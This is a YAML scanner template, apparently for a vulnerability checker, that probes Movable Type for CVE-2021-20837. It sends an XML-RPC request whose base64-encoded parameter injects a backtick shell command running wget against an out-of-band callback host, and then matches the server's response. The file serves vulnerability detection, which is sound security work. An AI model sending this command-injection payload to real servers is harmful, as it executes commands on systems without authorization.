id:
name: CVE-2021-20837
transport: http
set:
  reverse: newReverse()
  reverseURL: reverse.ip
tags:
  - movabletype-opensource
rules:
  req:
    request:
      read_timeout: 15
      cache: true
      method: POST
      path: /cgi-bin/mt/mt-xmlrpc.cgi
      body: |
        <?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
          <methodName>mt.handler_to_coderef</methodName>
          <params>
            <param>
              <value>
                <base64>
                  {{base64("`wget http://{{reverseURL}}`")}}
                </base64>
              </value>
            </param>
          </params>
        </methodCall>
    expression: response.status==200 &&
                response.body.bcontains(b'failed loading package')
expression: req()
detail:
  vulnerability:
    proof:
      info: "存在CVE-2021-20837漏洞"